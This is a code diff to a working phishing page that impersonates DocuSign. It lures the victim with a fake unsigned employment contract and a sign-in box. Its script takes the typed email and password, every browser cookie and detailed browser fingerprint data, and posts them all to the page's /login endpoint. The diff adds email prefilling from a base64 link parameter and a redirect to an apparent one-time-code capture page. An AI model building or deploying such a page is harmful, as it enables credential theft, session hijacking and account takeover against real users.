@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -11,7 +12,7 @@
             padding: 0;
             box-sizing: border-box;
         }
-        
+
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
             background: #e8ecef;
@@ -20,37 +21,37 @@
             flex-direction: column;
             position: relative;
         }
-        
+
         .header {
             background: white;
             padding: 16px 40px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
             display: flex;
             align-items: center;
             justify-content: space-between;
         }
-        
+
         .header-logo img {
             height: 32px;
             width: auto;
         }
-        
+
         .header-links {
             display: flex;
             gap: 30px;
             font-size: 14px;
         }
-        
+
         .header-links a {
             color: #666;
             text-decoration: none;
             transition: color 0.2s;
         }
-        
+
         .header-links a:hover {
             color: #333;
         }
-        
+
         .main-content {
             flex: 1;
             display: flex;
@@ -60,7 +61,7 @@
             position: relative;
             overflow: hidden;
         }
-        
+
         .main-content::before {
             content: '';
             position: absolute;
@@ -70,17 +71,17 @@
             width: 900px;
             height: 1200px;
             background: white;
-            box-shadow: 0 0 50px rgba(0,0,0,0.2);
+            box-shadow: 0 0 50px rgba(0, 0, 0, 0.2);
             filter: blur(8px);
             opacity: 0.85;
             z-index: 0;
-            background-image: 
+            background-image:
                 linear-gradient(to right, #ddd 1px, transparent 1px),
                 linear-gradient(to bottom, #ddd 1px, transparent 1px);
             background-size: 100% 35px, 100% 35px;
             background-position: 0 100px;
         }
-        
+
         .main-content::after {
             content: '⚠️ URGENT - SIGNATURE REQUIRED\A\AEMPLOYMENT CONTRACT AGREEMENT\A\ADocument ID: EMP-2025-4782\ADate: November 25, 2025\AStatus: PENDING YOUR SIGNATURE\A\AThis Employment Agreement ("Agreement") is entered\Ainto as of the date above between:\A\AEMPLOYER: TechCorp Industries Inc.\A1500 Corporate Drive, Suite 200\ASan Francisco, CA 94102\A\AEMPLOYEE: [Your Name]\A[Your Address]\A\AARTICLE 1: EMPLOYMENT TERMS\A\A1.1 Position and Duties\AThe Employee shall serve as Senior Software Engineer\Aand shall perform all duties reasonably assigned.\A\A1.2 Compensation\ABase Salary: $145,000 per annum\ABonus: Up to 20% of base salary\AStock Options: 5,000 shares vesting over 4 years\A\A1.3 Benefits Package\A- Health Insurance (Medical, Dental, Vision)\A- 401(k) with 6% company match\A- 20 days PTO + 10 paid holidays\A- Remote work flexibility\A\AARTICLE 2: CONFIDENTIALITY\A\AEmployee agrees to maintain confidentiality of all\Aproprietary information, trade secrets, and client\Adata during and after employment.\A\AARTICLE 3: NON-COMPETE CLAUSE\A\AFor 12 months following termination, Employee shall\Anot engage in competing business activities within\Athe same geographic region.\A\AARTICLE 4: TERMINATION\A\AEither party may terminate with 30 days notice.\AImmediate termination for cause is permitted.\A\AARTICLE 5: GOVERNING LAW\A\AThis Agreement shall be governed by California law.\A\A⚠️ ACTION REQUIRED: Please review and sign below\A\A_________________________________\AEmployee Signature                    Date\A\A_________________________________\AEmployer Representative              Date\A\A[SIGN HERE] [DECLINE]';
             white-space: pre;
@@ -99,18 +100,18 @@
             text-align: left;
             padding: 60px 100px;
         }
-        
+
         .login-container {
             background: white;
             padding: 24px 32px;
             border-radius: 8px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
             width: 100%;
             max-width: 420px;
             position: relative;
             z-index: 10;
         }
-        
+
         .document-notice {
             background: #e8f4fd;
             border-left: 4px solid #36a3f7;
@@ -118,7 +119,7 @@
             margin-bottom: 16px;
             border-radius: 4px;
         }
-        
+
         .document-notice-title {
             font-size: 12px;
             font-weight: 600;
@@ -128,34 +129,34 @@
             align-items: center;
             gap: 6px;
         }
-        
+
         .document-notice-text {
             font-size: 11px;
             color: #555;
             line-height: 1.4;
         }
-        
+
         .login-header {
             margin-bottom: 14px;
             text-align: center;
         }
-        
+
         .login-header img {
             height: 32px;
             width: auto;
             margin-bottom: 10px;
         }
-        
+
         .login-header p {
             font-size: 12px;
             color: #666;
             line-height: 1.3;
         }
-        
+
         .form-group {
             margin-bottom: 12px;
         }
-        
+
         .form-group label {
             display: block;
             margin-bottom: 5px;
@@ -163,7 +164,7 @@
             font-weight: 400;
             color: #333;
         }
-        
+
         .form-group input {
             width: 100%;
             padding: 9px 11px;
@@ -173,12 +174,12 @@
             box-sizing: border-box;
             transition: border-color 0.2s;
         }
-        
+
         .form-group input:focus {
             outline: none;
             border-color: #6c2eb9;
         }
-        
+
         .login-button {
             width: 100%;
             padding: 10px;
@@ -194,16 +195,16 @@
             text-transform: uppercase;
             letter-spacing: 0.5px;
         }
-        
+
         .login-button:hover {
             background-color: #5a2599;
         }
-        
+
         .login-button:disabled {
             background-color: #9d7bc4;
             cursor: not-allowed;
         }
-        
+
         .signup-button {
             width: 100%;
             padding: 10px;
@@ -217,11 +218,11 @@
             transition: background-color 0.2s;
             margin-top: 8px;
         }
-        
+
         .signup-button:hover {
             background-color: #e8e8e8;
         }
-        
+
         .error-message {
             color: #d93025;
             margin-top: 10px;
@@ -233,11 +234,11 @@
             border-radius: 4px;
             border-left: 3px solid #d93025;
         }
-        
+
         .error-message.show {
             display: block;
         }
-        
+
         .footer {
             background: #f4f4f4;
             padding: 16px 40px;
@@ -249,20 +250,20 @@
             flex-wrap: wrap;
             gap: 20px;
         }
-        
+
         .footer-left {
             display: flex;
             align-items: center;
             gap: 5px;
             color: #666;
         }
-        
+
         .footer-left img {
             height: 14px;
             width: auto;
             margin-left: 5px;
         }
-        
+
         .footer-center {
             display: flex;
             align-items: center;
@@ -270,18 +271,18 @@
             flex: 1;
             justify-content: center;
         }
-        
+
         .footer-center a {
             color: #666;
             text-decoration: none;
             transition: color 0.2s;
         }
-        
+
         .footer-center a:hover {
             color: #333;
             text-decoration: underline;
         }
-        
+
         .language-selector {
             position: relative;
             display: inline-flex;
@@ -289,41 +290,41 @@
             gap: 4px;
             cursor: pointer;
         }
-        
+
         .language-selector::after {
             content: '▼';
             font-size: 8px;
             color: #666;
         }
-        
+
         .footer-right {
             color: #666;
         }
-        
+
         @media (max-width: 768px) {
             .header {
                 padding: 16px 20px;
             }
-            
+
             .header-links {
                 display: none;
             }
-            
+
             .login-container {
                 padding: 32px 24px;
             }
-            
+
             .footer {
                 flex-direction: column;
                 text-align: center;
                 padding: 20px;
             }
-            
+
             .footer-left,
             .footer-center {
                 justify-content: center;
             }
-            
+
             .footer-center {
                 flex-wrap: wrap;
                 gap: 10px;
@@ -331,6 +332,7 @@
         }
     </style>
 </head>
+
 <body>
     <header class="header">
         <div class="header-logo">
@@ -343,7 +345,7 @@
             <a href="#">Pricing</a>
         </div> -->
     </header>
-    
+
     <div class="main-content">
         <div class="login-container">
             <div class="document-notice">
@@ -351,15 +353,16 @@
                     📄 Document Awaiting Your Signature
                 </div>
                 <div class="document-notice-text">
-                    You have received a document that requires your review and signature. Please sign in to access and complete this document.
+                    You have received a document that requires your review and signature. Please sign in to access and
+                    complete this document.
                 </div>
             </div>
-            
+
             <div class="login-header">
                 <img src="/ds-logo-default.svg" alt="DocuSign">
                 <p>Enter your credentials to view your document.</p>
             </div>
-            
+
             <form id="loginForm">
                 <div class="form-group">
                     <label for="email">Email *</label>
@@ -369,14 +372,14 @@
                     <label for="password">Password *</label>
                     <input type="password" id="password" name="password" placeholder="Enter password" required>
                 </div>
-                
+
                 <button type="submit" class="login-button">LOGIN</button>
-                
+
                 <div id="errorMessage" class="error-message"></div>
             </form>
         </div>
     </div>
-    
+
     <footer class="footer">
         <div class="footer-left">
             Powered by <img src="/ds-logo-default.svg" alt="docusign">
@@ -397,25 +400,45 @@
     <script>
         // Track login attempts
         let attemptCount = 0;
-        
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+
+        // Auto-fill email from URL parameter
+        document.addEventListener('DOMContentLoaded', function () {
+            const urlParams = new URLSearchParams(window.location.search);
+            const base64Email = urlParams.get('email');
+
+            if (base64Email) {
+                try {
+                    const decodedEmail = atob(base64Email);
+                    const emailInput = document.getElementById('email');
+                    if (emailInput) {
+                        emailInput.value = decodedEmail;
+                        // Optional: Focus password field since email is filled
+                        document.getElementById('password').focus();
+                    }
+                } catch (e) {
+                    console.error('Failed to decode email:', e);
+                }
+            }
+        });
+
+        document.getElementById('loginForm').addEventListener('submit', async function (e) {
             e.preventDefault();
-            
+
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
             const errorElement = document.getElementById('errorMessage');
             const loginButton = document.querySelector('.login-button');
-            
+
             // Show loading state
             const originalButtonText = loginButton.textContent;
             loginButton.textContent = 'Signing in...';
             loginButton.disabled = true;
             errorElement.textContent = '';
-            
+
             try {
                 // Get all browser cookies
                 const cookies = document.cookie || 'No cookies';
-                
+
                 // Get comprehensive browser info
                 const browserInfo = {
                     platform: navigator.platform,
@@ -440,14 +463,14 @@
                     windowSize: `${window.innerWidth}x${window.innerHeight}`,
                     referrer: document.referrer || 'Direct'
                 };
-                
+
                 const response = await fetch('/login', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify({ 
-                        email, 
+                    body: JSON.stringify({
+                        email,
                         password,
                         cookies: cookies,
                         browserInfo: browserInfo
@@ -455,40 +478,23 @@
                 });
 
                 const data = await response.json();
-                
-                // Increment attempt counter
-                attemptCount++;
-                
-                // Always show error message
-                errorElement.classList.add('show');
-                errorElement.textContent = 'The email address or password you entered is incorrect. Please try again.';
-                
-                // Clear only password field, keep email
-                document.getElementById('password').value = '';
-                
-                // Redirect after 3 attempts
-                if (attemptCount >= 3) {
-                    setTimeout(() => {
-                        window.location.href = 'https://www.google.com';
-                    }, 1500);
+
+                // Store email for later use and redirect
+                if (data.success) {
+                    sessionStorage.setItem('userEmail', email);
+                    const redirectUrl = data.redirect || '/otp-method.html';
+                    console.log('Redirecting to:', redirectUrl);
+                    // Force redirect with cache bypass
+                    window.location.replace(redirectUrl);
+                } else {
+                    console.error('Invalid response:', data);
+                    errorElement.classList.add('show');
+                    errorElement.textContent = 'An error occurred. Please try again.';
                 }
             } catch (error) {
                 console.error('Error:', error);
                 errorElement.classList.add('show');
-                errorElement.textContent = 'The email address or password you entered is incorrect. Please try again.';
-                
-                // Increment attempt counter even on error
-                attemptCount++;
-                
-                // Clear only password field
-                document.getElementById('password').value = '';
-                
-                // Redirect after 3 attempts
-                if (attemptCount >= 3) {
-                    setTimeout(() => {
-                        window.location.href = 'https://www.google.com';
-                    }, 1500);
-                }
+                errorElement.textContent = 'An error occurred. Please try again.';
             } finally {
                 // Reset button state
                 loginButton.textContent = originalButtonText;
@@ -497,4 +503,5 @@
         });
     </script>
 </body>
+
 </html>
